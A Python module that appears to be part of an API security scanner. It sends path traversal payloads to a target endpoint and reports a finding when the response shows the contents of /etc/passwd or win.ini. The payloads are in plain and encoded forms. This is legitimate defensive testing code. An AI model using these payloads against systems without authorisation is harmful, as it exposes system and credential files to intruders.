#!/usr/bin/env python3
"""Path Traversal Scanner"""

from typing import Dict, List, Optional, Any
import requests
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class PathTraversalScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("path_traversal")
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, headers: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
        traversal_payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        sensitive_patterns = [
            "root:",
            "[boot loader]",
            "mail:",
            "/bin/bash",
            "/home/"
        ]
        
        for payload in traversal_payloads:
            try:
                test_resp = self.make_request(
                    method=method,
                    endpoint=f"{path}?file={payload}",
                    headers={"Content-Type": "application/json"}
                )
                
                if any(pattern in test_resp.text for pattern in sensitive_patterns):
                    request_data, response_data = self.capture_transaction(test_resp)
                    
                    self.add_finding(
                        title="Path Traversal Vulnerability",
                        description=f"Successfully accessed system files using: {payload}",
                        endpoint=path,
                        severity_level="tier2",
                        impact="Unauthorized access to system files and sensitive data",
                        request=request_data,
                        response=response_data,
                        remediation="Implement proper file path validation and use safe file handling methods"
                    )
                    
            except requests.RequestException as e:
                self.logger.error(f"Error testing path traversal payload {payload}: {str(e)}")
                
        return self.findings

scan = PathTraversalScanner().scan